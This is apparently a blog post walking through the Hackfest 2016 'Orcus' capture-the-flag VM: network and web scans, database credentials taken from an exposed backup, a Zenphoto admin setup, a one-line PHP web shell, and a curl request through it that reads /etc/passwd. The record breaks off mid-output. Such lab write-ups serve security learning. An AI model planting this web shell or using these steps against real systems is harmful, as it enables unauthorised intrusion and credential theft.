---
layout: post
title: hackfest2016-Orcus
slug: hackfest-2016-orcus
name: hackfest2016-Orcus
---
# Orcus

Start out by hitting: http://10.37.129.9/ looks about the same as the previous two.

## Recon!

### netdiscover

{% highlight bash %}
sudo netdiscover -r 10.37.129.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 144
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
10.37.129.1     00:1c:42:00:00:19      1      42  Parallels, Inc.
10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
10.37.129.9     00:1c:42:1e:25:17      1      60  Parallels, Inc.
{% endhighlight %}

### nmap

nmap -T4 -sV -v 10.37.129.9 -oA orcus

Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-10 21:30 MDT
NSE: Loaded 41 scripts for scanning.
Initiating Ping Scan at 21:30
Scanning 10.37.129.9 [2 ports]
Completed Ping Scan at 21:30, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:30
Stats: 0:00:11 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Completed Parallel DNS resolution of 1 host. at 21:31, 13.00s elapsed
Initiating Connect Scan at 21:31
Scanning 10.37.129.9 [1000 ports]
Discovered open port 995/tcp on 10.37.129.9
Discovered open port 143/tcp on 10.37.129.9
Discovered open port 443/tcp on 10.37.129.9
Discovered open port 53/tcp on 10.37.129.9
Discovered open port 139/tcp on 10.37.129.9
Discovered open port 445/tcp on 10.37.129.9
Discovered open port 110/tcp on 10.37.129.9
Discovered open port 22/tcp on 10.37.129.9
Discovered open port 993/tcp on 10.37.129.9
Discovered open port 111/tcp on 10.37.129.9
Discovered open port 80/tcp on 10.37.129.9
Discovered open port 2049/tcp on 10.37.129.9
Completed Connect Scan at 21:31, 0.08s elapsed (1000 total ports)
Initiating Service scan at 21:31
Scanning 12 services on 10.37.129.9
Completed Service scan at 21:31, 11.02s elapsed (12 services on 1 host)
NSE: Script scanning 10.37.129.9.
Initiating NSE at 21:31
Completed NSE at 21:31, 0.04s elapsed
Initiating NSE at 21:31
Completed NSE at 21:31, 0.00s elapsed
Nmap scan report for 10.37.129.9
Host is up (0.0048s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain      ISC BIND 9.10.3-P4-Ubuntu
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp  open  pop3        Dovecot pop3d
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
443/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd
995/tcp  open  ssl/pop3    Dovecot pop3d
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds

### nikto

{% highlight bash %}
nikto -host 10.37.129.9 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.37.129.9
+ Target Hostname:    10.37.129.9
+ Target Port:        80
+ Start Time:         2017-08-07 20:42:45 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x65 0x53ff6086e56aa
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/exponent.js.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/exponent.js2.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/exponent.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/exponent_bootstrap.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/exponent_constants.php' in robots.txt returned a non-forbidden or redirect HTTP code (500)
+ Entry '/exponent_php_setup.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/exponent_version.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/getswversion.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/login.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/overrides.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/site_rss.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/source_selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/thumb.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/ABOUT.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/CHANGELOG.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/CREDITS.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALLATION.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/README.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/RELEASE.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/TODO.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /files/: Directory indexing found.
+ Entry '/files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /tmp/: Directory indexing found.
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 30 entries which should be manually viewed.
+ Multiple index files found: /index.php, /index.html
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-2870: /index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server.
+ OSVDB-59085: /index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-59085: /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /files/: This might be interesting...
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /phpmyadmin/: phpMyAdmin directory found
+ 26349 requests: 0 error(s) and 47 item(s) reported on remote host
+ End Time:           2017-08-07 20:44:44 (GMT-6) (119 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

{% highlight bash %}
dirb http://10.37.129.9 /usr/share/wordlists/dirb/big.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Aug  7 20:59:38 2017
URL_BASE: http://10.37.129.9/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458

---- Scanning URL: http://10.37.129.9/ ----
==> DIRECTORY: http://10.37.129.9/FCKeditor/
+ http://10.37.129.9/LICENSE (CODE:200|SIZE:15437)
==> DIRECTORY: http://10.37.129.9/admin/
==> DIRECTORY: http://10.37.129.9/backups/
==> DIRECTORY: http://10.37.129.9/cron/
==> DIRECTORY: http://10.37.129.9/external/
==> DIRECTORY: http://10.37.129.9/files/
==> DIRECTORY: http://10.37.129.9/framework/
==> DIRECTORY: http://10.37.129.9/install/
==> DIRECTORY: http://10.37.129.9/javascript/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/
+ http://10.37.129.9/robots.txt (CODE:200|SIZE:1347)
+ http://10.37.129.9/server-status (CODE:403|SIZE:299)
==> DIRECTORY: http://10.37.129.9/themes/
==> DIRECTORY: http://10.37.129.9/tmp/
+ http://10.37.129.9/webalizer (CODE:200|SIZE:0)
==> DIRECTORY: http://10.37.129.9/zenphoto/

---- Entering directory: http://10.37.129.9/FCKeditor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/admin/ ----
==> DIRECTORY: http://10.37.129.9/admin/gallery/

---- Entering directory: http://10.37.129.9/backups/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/cron/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/external/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/framework/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/ ----
==> DIRECTORY: http://10.37.129.9/install/changes/
==> DIRECTORY: http://10.37.129.9/install/files/
==> DIRECTORY: http://10.37.129.9/install/images/
==> DIRECTORY: http://10.37.129.9/install/include/
==> DIRECTORY: http://10.37.129.9/install/pages/
==> DIRECTORY: http://10.37.129.9/install/popups/
==> DIRECTORY: http://10.37.129.9/install/samples/
==> DIRECTORY: http://10.37.129.9/install/upgrades/

---- Entering directory: http://10.37.129.9/javascript/ ----
==> DIRECTORY: http://10.37.129.9/javascript/jquery/

---- Entering directory: http://10.37.129.9/phpmyadmin/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/doc/
+ http://10.37.129.9/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)
==> DIRECTORY: http://10.37.129.9/phpmyadmin/js/
+ http://10.37.129.9/phpmyadmin/libraries (CODE:403|SIZE:306)
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/
+ http://10.37.129.9/phpmyadmin/setup (CODE:401|SIZE:458)
==> DIRECTORY: http://10.37.129.9/phpmyadmin/sql/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/

---- Entering directory: http://10.37.129.9/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/ ----
+ http://10.37.129.9/zenphoto/LICENSE (CODE:200|SIZE:18205)
==> DIRECTORY: http://10.37.129.9/zenphoto/albums/
==> DIRECTORY: http://10.37.129.9/zenphoto/cache/
==> DIRECTORY: http://10.37.129.9/zenphoto/cache_html/
==> DIRECTORY: http://10.37.129.9/zenphoto/plugins/
+ http://10.37.129.9/zenphoto/robots.txt (CODE:200|SIZE:471)
==> DIRECTORY: http://10.37.129.9/zenphoto/themes/
==> DIRECTORY: http://10.37.129.9/zenphoto/uploaded/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-data/

---- Entering directory: http://10.37.129.9/admin/gallery/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/changes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/include/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/popups/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/samples/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/install/upgrades/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/javascript/jquery/ ----
+ http://10.37.129.9/javascript/jquery/jquery (CODE:200|SIZE:284394)

---- Entering directory: http://10.37.129.9/phpmyadmin/doc/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/doc/html/

---- Entering directory: http://10.37.129.9/phpmyadmin/js/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/js/jquery/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/js/pmd/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/js/transformations/

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/az/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/bg/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/bn/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ca/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/cs/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/da/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/de/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/el/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/es/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/et/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/fi/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/fr/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/gl/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/hu/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/hy/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ia/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/id/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/it/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ja/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ko/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/lt/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/nb/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/nl/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/pl/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/pt/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/pt_BR/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ro/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/ru/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/si/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/sk/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/sl/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/sq/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/sv/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/tr/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/uk/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/vi/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/zh_CN/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/locale/zh_TW/

---- Entering directory: http://10.37.129.9/phpmyadmin/sql/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/components/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/database/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/error/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/javascript/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/list/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/navigation/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/table/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/test/

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/original/

---- Entering directory: http://10.37.129.9/zenphoto/albums/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/cache/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/cache_html/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/uploaded/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/ ----
+ http://10.37.129.9/zenphoto/zp-core/dataaccess (CODE:200|SIZE:187)
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/exif/
+ http://10.37.129.9/zenphoto/zp-core/htaccess (CODE:200|SIZE:546)
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/images/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/js/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/locale/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/setup/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/utilities/
==> DIRECTORY: http://10.37.129.9/zenphoto/zp-core/watermarks/

---- Entering directory: http://10.37.129.9/zenphoto/zp-data/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/phpmyadmin/doc/html/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/doc/html/_static/

---- Entering directory: http://10.37.129.9/phpmyadmin/js/jquery/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/js/pmd/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/js/transformations/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/az/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/bg/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/bn/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ca/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/cs/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/da/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/de/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/el/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/es/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/et/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/fi/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/fr/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/gl/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/hu/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/hy/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ia/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/id/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/it/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ja/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ko/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/lt/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/nb/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/nl/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/pl/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/pt/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/pt_BR/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ro/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/ru/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/si/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/sk/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/sl/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/sq/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/sv/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/tr/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/uk/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/vi/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/zh_CN/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/locale/zh_TW/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/components/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/database/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/database/designer/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/database/structure/

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/error/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/javascript/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/list/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/navigation/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/table/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/table/chart/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/table/relation/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/table/search/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/templates/table/structure/

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/test/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/original/css/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/original/img/
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/original/jquery/

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/exif/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/locale/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/setup/ ----

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/utilities/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/zenphoto/zp-core/watermarks/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.9/phpmyadmin/doc/html/_static/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/database/designer/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/database/structure/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/table/chart/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/table/relation/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/table/search/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/templates/table/structure/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/original/css/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/original/img/ ----

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://10.37.129.9/phpmyadmin/themes/original/jquery/images/

---- Entering directory: http://10.37.129.9/phpmyadmin/themes/original/jquery/images/ ----

-----------------
END_TIME: Mon Aug  7 21:08:10 2017
DOWNLOADED: 1575266 - FOUND: 12
{% endhighlight %}

## Gaining Access

http://10.37.129.9/admin/

Tried root/password and root/root no luck, moving on.

{% highlight html %}
<!-- This is a backup taken from the backups/-->
{% endhighlight %}

http://10.37.129.9/backups/

{% highlight html %}
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /backups</title>
 </head>
 <body>
<h1>Index of /backups</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="SimplePHPQuiz-Backupz.tar.gz">SimplePHPQuiz-Backupz.tar.gz</a></td><td align="right">2016-10-31 20:29  </td><td align="right">210K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="ssh-creds.bak">ssh-creds.bak</a></td><td align="right">2016-11-01 21:33  </td><td align="right"> 12 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.37.129.9 Port 80</address>
</body></html>
{% endhighlight %}

{% highlight bash %}
wget http://10.37.129.9/backups/SimplePHPQuiz-Backupz.tar.gz
tar -zxvf SimplePHPQuiz-Backupz.tar.gz
cd SimplePHPQuiz
grep -ir 'password' *
includes/db_conn.php:DEFINE ('DB_PASSWORD', 'dbpassword');
includes/db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
grep -ir 'db_user' *
includes/db_conn.php:DEFINE ('DB_USER', 'dbuser');
includes/db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
{% endhighlight %}

http://10.37.129.9/admin/

dbuser:dbpassword

success

Still nothing....

http://10.37.129.9/zenphoto

Loads up the zenphoto installer, so I set it up with the db credentials from the SimplePHPQuiz configs.

Now add my own admin user, admin:dr0wss4p!

Poke around a bit to try and upload a file, then looking through plugins I see the option to enable elFinder, turn it on and create a shell.php file, then edit the file in elFinder:

{% highlight php %}
<?php system($_GET["cmd"]); ?>
{% endhighlight %}

This will serve as a starting point to getting a real reverse shell going:

curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd

To test it out:

{% highlight bash %}
curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd
*   Trying 10.37.129.9...
* TCP_NODELAY set
* Connected to 10.37.129.9 (10.37.129.9) port 80 (#0)
> GET /zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
> Host: 10.37.129.9
> User-Agent: curl/7.52.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Tue, 08 Aug 2017 04:37:55 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 2156
< Content-Type: text/html; charset=UTF-8
<
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
